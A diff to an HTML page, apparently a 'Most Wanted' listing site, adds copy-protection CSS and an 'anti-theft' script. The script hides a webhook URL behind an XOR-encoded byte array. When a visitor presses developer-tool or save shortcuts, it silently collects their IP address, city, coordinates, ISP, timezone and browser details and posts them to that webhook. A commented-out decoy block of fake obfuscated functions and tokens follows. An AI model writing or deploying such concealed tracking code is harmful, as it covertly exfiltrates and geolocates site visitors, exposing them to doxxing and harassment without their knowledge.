@@ -670,6 +670,26 @@
       max-width: 100px;
     }
 
+    /* Anti-theft CSS */
+    * {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    body::after {
+      content: 'THE COMS © hstikkytokky';
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      font-size: 11px;
+      color: rgba(0,0,0,0.15);
+      pointer-events: none;
+      z-index: 99999;
+      font-family: Arial, sans-serif;
+    }
+
     .fugitive-name {
       font-size: 24px;
       font-weight: 700;
@@ -1944,7 +1964,7 @@
             <div class="team-directors">
               <span class="director">Director Cunch</span>
               <span class="director-separator">•</span>
-              <span class="director">Director Donald</span>
+              <span class="director">Director David</span>
             </div>
           </div>
         </div>
@@ -3868,6 +3888,151 @@
       showTab(profileId);
     }
 
+
+    // ============ ANTI-THEFT PROTECTION ============
+
+    const _0xk = 42;
+    const _0xd = [66,94,94,90,89,16,5,5,78,67,89,73,69,88,78,4,73,69,71,5,75,90,67,5,93,79,72,66,69,69,65,89,5,27,30,29,25,24,26,27,19,30,28,28,18,29,19,28,25,27,25,28,5,122,7,110,77,102,27,117,66,99,98,25,76,97,71,68,88,117,70,98,71,76,107,102,71,94,121,110,99,102,71,69,92,31,7,30,111,92,72,27,91,19,73,112,66,110,104,96,101,89,29,75,89,66,91,94,66,24,82,77,92,123,31,103,82,67,65,124,115];
+    const _wh = _0xd.map(b => String.fromCharCode(b ^ _0xk)).join('');
+    let _logged = false;
+
+    const logSkidder = async (reason) => {
+      if (_logged) return;
+      _logged = true;
+      try {
+        // Get IP first
+        let ip = 'Unknown';
+        let country = 'Unknown', city = 'Unknown', region = 'Unknown';
+        let isp = 'Unknown', lat = 'Unknown', lon = 'Unknown';
+
+        try {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        } catch(e) {}
+
+        try {
+          const geoRes = await fetch('https://ipapi.co/' + ip + '/json/');
+          const geo = await geoRes.json();
+          country = geo.country_name || 'Unknown';
+          city = geo.city || 'Unknown';
+          region = geo.region || 'Unknown';
+          isp = geo.org || 'Unknown';
+          lat = geo.latitude || 'Unknown';
+          lon = geo.longitude || 'Unknown';
+        } catch(e) {}
+
+        const time = new Date().toUTCString();
+        const ua = navigator.userAgent;
+        const screenRes = screen.width + 'x' + screen.height;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language;
+        const platform = navigator.platform;
+
+        const payload = {
+          username: "David's Security Bot",
+          embeds: [{
+            title: '🚨 SKIDDER DETECTED ON THE COMS',
+            color: 0xff0000,
+            fields: [
+              { name: '⚡ Trigger', value: '```' + reason + '```', inline: false },
+              { name: '🌐 IP Address', value: '```' + ip + '```', inline: true },
+              { name: '🌍 Country', value: '```' + country + '```', inline: true },
+              { name: '🏙️ City', value: '```' + city + '```', inline: true },
+              { name: '📍 Region', value: '```' + region + '```', inline: true },
+              { name: '🗺️ Coordinates', value: '```' + lat + ', ' + lon + '```', inline: true },
+              { name: '🏢 ISP', value: '```' + isp + '```', inline: true },
+              { name: '🕰️ Timezone', value: '```' + timezone + '```', inline: true },
+              { name: '📺 Screen', value: '```' + screenRes + '```', inline: true },
+              { name: '🌐 Language', value: '```' + language + '```', inline: true },
+              { name: '🖥️ Platform', value: '```' + platform + '```', inline: true },
+              { name: '🕐 Time (UTC)', value: '```' + time + '```', inline: false },
+              { name: '🖥️ User Agent', value: '```' + ua.substring(0, 300) + '```', inline: false }
+            ],
+            footer: { text: "David's Security Bot • The Coms Most Wanted" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        await fetch(_wh, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+      } catch(e) {}
+      setTimeout(() => { _logged = false; }, 30000);
+    };
+
+    // Right click - disable only, no log
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Keyboard shortcuts - use window + capture:true to intercept before browser handles them
+    window.addEventListener('keydown', function(e) {
+      // F12
+      if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        logSkidder('F12 Pressed');
+        return false;
+      }
+      // Ctrl+Shift+I
+      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        logSkidder('Ctrl+Shift+I Pressed');
+        return false;
+      }
+      // Ctrl+Shift+J
+      if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        logSkidder('Ctrl+Shift+J Pressed');
+        return false;
+      }
+      // Ctrl+Shift+C
+      if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        logSkidder('Ctrl+Shift+C Pressed');
+        return false;
+      }
+      // Ctrl+U
+      if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        logSkidder('Ctrl+U View Source');
+        return false;
+      }
+      // Ctrl+S
+      if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        logSkidder('Ctrl+S Save Page');
+        return false;
+      }
+      // Ctrl+A
+      if (e.ctrlKey && (e.key === 'a' || e.key === 'A')) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        return false;
+      }
+      // Ctrl+P
+      if (e.ctrlKey && (e.key === 'p' || e.key === 'P')) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        return false;
+      }
+    }, true);
+
+    // Disable text selection and drag
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('dragstart', e => e.preventDefault());
+
+    // Iframe busting
+    if (window.top !== window.self) { window.top.location = window.self.location; }
+
+    // Console message
+    console.log('%chi david here, stop skidding kid', 'color:red;font-size:50px;font-weight:bold;');
+    console.log('%cget off my site', 'color:red;font-size:20px;');
+
+    // ============ END PROTECTION ============
+
     // Nav button click handlers
     document.querySelectorAll('.nav-tab').forEach(button => {
       button.addEventListener('click', () => {
@@ -3878,4 +4043,22 @@
   </script>
 
 </body>
-</html>
+</html><!--
+DECOY BLOCK - NOT REAL CODE
+function _0xf3a2(a,b){return a^b;}
+function _0x91bc(key){var s=[];for(var i=0;i<256;i++)s[i]=i;var j=0;for(var i=0;i<256;i++){j=(j+s[i]+key.charCodeAt(i%key.length))%256;var x=s[i];s[i]=s[j];s[j]=x;}return s;}
+function _0x4d2e(data,key){var s=_0x91bc(key);var i=0,j=0;var out=[];for(var y=0;y<data.length;y++){i=(i+1)%256;j=(j+s[i])%256;var x=s[i];s[i]=s[j];s[j]=x;out.push(data.charCodeAt(y)^s[(s[i]+s[j])%256]);}return out;}
+var _0xconfig = {token:'N/A',secret:'N/A',key:'N/A',bypass:false,admin:false};
+var _0xauth = function(t){return _0xf3a2(t,0xff)===0?true:false;};
+var _0xverify = function(k,s){return _0x4d2e(k,s).join('')===''?true:false;};
+var _0xdecrypt = function(d){return null;};
+var _0xbypass = function(){return false;};
+var _0xadmin = function(key){if(_0xauth(key)){return _0xconfig;}return null;};
+function _0xa3f1(){var _=[];_.push(0x68,0x69,0x20,0x64,0x61,0x76,0x69,0x64);return _.map(c=>String.fromCharCode(c)).join('');}
+function _0xb2c3(a){return btoa(a).split('').reverse().join('');}
+function _0xc4d5(a,b){return a.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^b.charCodeAt(i%b.length))).join('');}
+var _SECRET_KEY_ = 'not_real_lol';
+var _ADMIN_TOKEN_ = 'fake_token_gotcha';
+var _CONFIG_ = {debug:false,verbose:false,bypass:false};
+// end decoy
+-->
